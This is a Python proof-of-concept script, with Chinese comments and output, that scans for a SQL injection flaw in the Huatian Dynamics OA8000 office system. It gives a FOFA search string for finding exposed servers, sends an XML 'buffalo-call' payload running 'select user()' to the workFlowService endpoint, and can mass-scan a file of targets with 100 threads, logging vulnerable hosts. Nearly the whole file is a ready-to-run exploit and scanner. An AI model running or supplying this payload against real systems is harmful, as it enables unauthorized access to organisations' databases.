# 华天动力oa SQL注入
# fofa: app="华天动力-OA8000"

import requests, sys, argparse
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()


def banner():
    test = """ 
                ███████╗ ██████╗ ██╗          ████████╗██╗███╗   ███╗███████╗
                ██╔════╝██╔═══██╗██║          ╚══██╔══╝██║████╗ ████║██╔════╝
                ███████╗██║   ██║██║             ██║   ██║██╔████╔██║█████╗
                ╚════██║██║▄▄ ██║██║             ██║   ██║██║╚██╔╝██║██╔══╝
                ███████║╚██████╔╝███████╗███████╗██║   ██║██║ ╚═╝ ██║███████╗
                ╚══════╝ ╚══▀▀═╝ ╚══════╝╚══════╝╚═╝   ╚═╝╚═╝     ╚═╝╚══════╝

                                                                          author:秋妤
                                                                          date:2024.09.06
                                                                          version:1.0


"""

    print(test)


def main():
    banner()
    parser = argparse.ArgumentParser(description='华天动力oa SQL注入')
    parser.add_argument("-u", "--url", dest="url", type=str, help="Please enter url")
    parser.add_argument("-f", "--file", dest="file", type=str, help="Please enter file")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")


def poc(target):
    url_payload = '/OAapp/bfapp/buffalo/workFlowService'
    headers = {
        'Accept-Encoding': 'identity',
        'User-Agent': ' Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)',
        'Cache-Control': ' max-age=0',
    }
    data = """
        <buffalo-call>
        <method>getDataListForTree</method>
        <string>select user()</string>
        </buffalo-call>
        """

    try:
        res1 = requests.post(url=target + url_payload, headers=headers, data=data, timeout=10)
        if res1.status_code == 200:
            print(f"[+]{target} 存在漏洞！")
            with open('华天动力oa_result.txt', 'a', encoding='utf-8') as fp:
                fp.write(target + '\n')
                return True
        else:
            print('[-] 不存在漏洞')
            return False
    except:
        print('目标网站存在问题，无法访问')


if __name__ == '__main__':
    main()